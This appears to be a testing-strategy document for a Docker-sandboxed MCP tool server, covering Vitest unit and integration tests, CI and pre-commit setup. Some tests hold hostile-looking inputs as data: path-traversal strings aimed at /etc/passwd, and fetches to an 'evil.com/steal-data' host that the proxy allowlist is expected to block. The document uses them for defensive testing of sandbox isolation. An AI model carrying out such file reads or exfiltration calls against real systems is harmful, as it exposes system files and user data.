# Testing Strategy

## Overview

Workbench MCP uses a layered testing approach:
1. **Unit Tests** — Fast, isolated, run on every commit
2. **Integration Tests** — Docker required, validate real container behavior
3. **Manual Checks** — Security verification, deployment validation

## Test Framework

**Primary:** Vitest  
**Why:** Fast, native ESM support, TypeScript-first, good DX

## Directory Structure

```
tests/
├── unit/
│   ├── config/
│   │   └── env.test.ts
│   ├── session/
│   │   ├── manager.test.ts
│   │   └── reaper.test.ts
│   ├── docker/
│   │   └── network.test.ts
│   ├── mcp/
│   │   └── schemas.test.ts
│   └── utils/
│       ├── mutex.test.ts
│       └── path.test.ts
└── integration/
    ├── fixtures/
    │   └── docker-compose.test.yml
    ├── session-lifecycle.test.ts
    ├── sandbox-exec.test.ts
    ├── sandbox-fs.test.ts
    ├── proxy-allowlist.test.ts
    └── cleanup.test.ts
```

## Unit Tests

### What to Test
- Configuration parsing and validation
- Allowlist URL matching
- Path validation (workspace confinement)
- Header blacklist enforcement
- Session TTL calculations
- Concurrency lock behavior
- Max sessions rejection logic
- Zod schema validation

### Commands
```bash
npm run test:unit        # Run all unit tests
npm run test:unit:watch  # Watch mode
npm run test:unit -- --coverage  # With coverage
```

### Example: Path Validation
```typescript
// tests/unit/utils/path.test.ts
import { describe, it, expect } from 'vitest';
import { validateWorkspacePath } from '@/utils/path';

describe('validateWorkspacePath', () => {
  it('accepts paths within workspace', () => {
    expect(validateWorkspacePath('src/main.ts'))
      .toBe('/workspace/src/main.ts');
  });

  it('accepts workspace root', () => {
    expect(validateWorkspacePath('/workspace'))
      .toBe('/workspace');
  });

  it('rejects path traversal', () => {
    expect(() => validateWorkspacePath('../etc/passwd'))
      .toThrow('Path must be within /workspace');
  });

  it('rejects absolute paths outside workspace', () => {
    expect(() => validateWorkspacePath('/etc/passwd'))
      .toThrow('Path must be within /workspace');
  });

  it('normalizes paths', () => {
    expect(validateWorkspacePath('./src/../src/main.ts'))
      .toBe('/workspace/src/main.ts');
  });
});
```

### Example: Allowlist Matching
```typescript
// tests/unit/session/allowlist.test.ts
import { describe, it, expect } from 'vitest';
import { isAllowed } from '@/proxy/allowlist';

describe('isAllowed', () => {
  const allowlist = [
    'http://homeassistant.local:8123',
    'http://192.168.10.16:9200',
    'https://*',
  ];

  it('allows exact match', () => {
    expect(isAllowed('http://homeassistant.local:8123/api/states', allowlist))
      .toBe(true);
  });

  it('allows wildcard https', () => {
    expect(isAllowed('https://example.com/api', allowlist))
      .toBe(true);
  });

  it('rejects non-matching HTTP', () => {
    expect(isAllowed('http://evil.com/steal', allowlist))
      .toBe(false);
  });

  it('rejects different port', () => {
    expect(isAllowed('http://homeassistant.local:9999/api', allowlist))
      .toBe(false);
  });

  it('handles edge cases', () => {
    expect(isAllowed('', allowlist)).toBe(false);
    expect(isAllowed('not-a-url', allowlist)).toBe(false);
  });
});
```

### Example: Session Manager
```typescript
// tests/unit/session/manager.test.ts
import { describe, it, expect, vi, beforeEach } from 'vitest';
import { SessionManager } from '@/session/manager';

describe('SessionManager', () => {
  let manager: SessionManager;
  let mockDocker: MockDockerClient;

  beforeEach(() => {
    mockDocker = createMockDockerClient();
    manager = new SessionManager({
      maxSessions: 5,
      idleTimeoutMs: 600000,
      docker: mockDocker,
    });
  });

  it('creates session on first request', async () => {
    const session = await manager.getOrCreate('conv-123');
    expect(session.conversationId).toBe('conv-123');
    expect(mockDocker.createNetwork).toHaveBeenCalled();
    expect(mockDocker.createContainer).toHaveBeenCalledTimes(2); // sandbox + proxy
  });

  it('reuses existing session', async () => {
    await manager.getOrCreate('conv-123');
    await manager.getOrCreate('conv-123');
    expect(mockDocker.createNetwork).toHaveBeenCalledTimes(1);
  });

  it('rejects when max sessions reached', async () => {
    for (let i = 0; i < 5; i++) {
      await manager.getOrCreate(`conv-${i}`);
    }
    await expect(manager.getOrCreate('conv-6'))
      .rejects.toThrow('Maximum sessions (5) reached');
  });

  it('updates lastActivityAt on access', async () => {
    const session1 = await manager.getOrCreate('conv-123');
    const time1 = session1.lastActivityAt;
    
    await new Promise(r => setTimeout(r, 10));
    
    const session2 = await manager.getOrCreate('conv-123');
    expect(session2.lastActivityAt).toBeGreaterThan(time1);
  });
});
```

## Integration Tests

### Requirements
- Docker Engine running
- Test containers built
- Network access for container creation

### What to Test
1. Session lifecycle: create → use → timeout → cleanup
2. `sandbox.exec`: runs command, captures output
3. `sandbox.fs.*`: read/write/list operations
4. Network isolation: sandbox cannot reach internet
5. Proxy allowlist: sandbox can reach allowed URLs
6. Cleanup: no orphaned containers/networks

### Setup
```yaml
# tests/integration/fixtures/docker-compose.test.yml
version: '3.8'

services:
  # Mock LAN service for allowlist testing
  mock-lan-service:
    image: nginx:alpine
    networks:
      - test-egress

  workbench:
    build: ../..
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
    environment:
      - WORKBENCH_PORT=3000
      - WORKBENCH_MAX_SESSIONS=2
      - WORKBENCH_IDLE_TIMEOUT_MIN=1
      - WORKBENCH_FETCH_ALLOWLIST=http://mock-lan-service
    networks:
      - test-egress

networks:
  test-egress:
```

### Example: Session Lifecycle
```typescript
// tests/integration/session-lifecycle.test.ts
import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { startTestEnv, stopTestEnv, client } from './helpers';

describe('Session Lifecycle', () => {
  beforeAll(async () => {
    await startTestEnv();
  });

  afterAll(async () => {
    await stopTestEnv();
  });

  it('creates sandbox on first request', async () => {
    const result = await client.call('sandbox.fs.list', {}, {
      headers: { 'X-Conversation-Id': 'test-conv-1' },
    });
    
    expect(result.entries).toContainEqual(
      expect.objectContaining({ path: 'src/main.ts', type: 'file' })
    );
  });

  it('main.ts runs successfully on fresh sandbox', async () => {
    const result = await client.call('sandbox.exec', {
      command: 'npx',
      args: ['tsx', 'src/main.ts'],
    }, {
      headers: { 'X-Conversation-Id': 'test-conv-2' },
    });
    
    expect(result.exitCode).toBe(0);
    expect(result.stdout).toContain('Hello from Workbench!');
  });

  it('session destroyed after idle timeout', async () => {
    await client.call('sandbox.fs.list', {}, {
      headers: { 'X-Conversation-Id': 'test-conv-3' },
    });
    
    // Wait for idle timeout (set to 1 min in test env)
    await new Promise(r => setTimeout(r, 65000));
    
    // New request should create fresh sandbox
    const result = await client.call('sandbox.fs.list', {}, {
      headers: { 'X-Conversation-Id': 'test-conv-3' },
    });
    
    // File we might have created earlier should be gone
    expect(result.entries).not.toContainEqual(
      expect.objectContaining({ path: 'test-file.txt' })
    );
  }, 70000);
});
```

### Example: Network Isolation
```typescript
// tests/integration/proxy-allowlist.test.ts
import { describe, it, expect } from 'vitest';

describe('Proxy Allowlist', () => {
  it('allows fetch to allowlisted service', async () => {
    // Write a script that uses fetch
    await client.call('sandbox.fs.write', {
      path: 'fetch-test.ts',
      content: `
        import { fetch } from '/toolbelt/http';
        const res = await fetch('http://mock-lan-service/');
        console.log('status:', res.status);
      `,
    }, { headers: { 'X-Conversation-Id': 'proxy-test-1' } });

    const result = await client.call('sandbox.exec', {
      command: 'npx',
      args: ['tsx', 'fetch-test.ts'],
    }, { headers: { 'X-Conversation-Id': 'proxy-test-1' } });

    expect(result.exitCode).toBe(0);
    expect(result.stdout).toContain('status: 200');
  });

  it('blocks direct internet access', async () => {
    await client.call('sandbox.fs.write', {
      path: 'direct-fetch.ts',
      content: `
        // Try direct fetch (should fail)
        try {
          await fetch('http://example.com');
          console.log('ERROR: should have failed');
        } catch (e) {
          console.log('BLOCKED as expected');
        }
      `,
    }, { headers: { 'X-Conversation-Id': 'proxy-test-2' } });

    const result = await client.call('sandbox.exec', {
      command: 'npx',
      args: ['tsx', 'direct-fetch.ts'],
    }, { headers: { 'X-Conversation-Id': 'proxy-test-2' } });

    expect(result.stdout).toContain('BLOCKED as expected');
  });

  it('blocks non-allowlisted proxy requests', async () => {
    await client.call('sandbox.fs.write', {
      path: 'blocked-proxy.ts',
      content: `
        import { fetch } from '/toolbelt/http';
        try {
          await fetch('http://evil.com/steal-data');
          console.log('ERROR: should have failed');
        } catch (e) {
          console.log('BLOCKED:', e.message);
        }
      `,
    }, { headers: { 'X-Conversation-Id': 'proxy-test-3' } });

    const result = await client.call('sandbox.exec', {
      command: 'npx',
      args: ['tsx', 'blocked-proxy.ts'],
    }, { headers: { 'X-Conversation-Id': 'proxy-test-3' } });

    expect(result.stdout).toContain('BLOCKED');
  });
});
```

## Pre-Commit Hooks

### Setup with Husky + lint-staged
```bash
npm install -D husky lint-staged
npx husky init
```

### Configuration
```json
// package.json
{
  "lint-staged": {
    "*.ts": [
      "eslint --fix",
      "prettier --write"
    ]
  }
}
```

```bash
# .husky/pre-commit
npm run lint-staged
npm run typecheck
npm run test:unit
```

## Manual Verification Checklist

### Security Verification
- [ ] Sandbox cannot ping external hosts
- [ ] Sandbox cannot resolve external DNS
- [ ] No environment variables with secrets in sandbox
- [ ] Audit log captures all tool calls

### Deployment Verification
- [ ] `docker compose up` starts successfully
- [ ] First request creates sandbox
- [ ] `main.ts` executes correctly
- [ ] Idle timeout triggers cleanup
- [ ] Restart cleans up orphans

## CI Pipeline

```yaml
# .github/workflows/ci.yml
name: CI

on: [push, pull_request]

jobs:
  lint-and-test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 20
          cache: npm
      
      - run: npm ci
      - run: npm run lint
      - run: npm run typecheck
      - run: npm run test:unit
      - run: npm run build

  integration:
    runs-on: ubuntu-latest
    needs: lint-and-test
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 20
          cache: npm
      
      - run: npm ci
      - run: docker compose -f tests/integration/fixtures/docker-compose.test.yml up -d
      - run: npm run test:integration
      - run: docker compose -f tests/integration/fixtures/docker-compose.test.yml down -v
```

## Coverage Goals

| Area | Target |
|------|--------|
| Utils (path, mutex, allowlist) | 90%+ |
| Session management | 80%+ |
| MCP tool schemas | 100% |
| Docker operations | 70%+ (mocked) |
| Integration | Key paths covered |
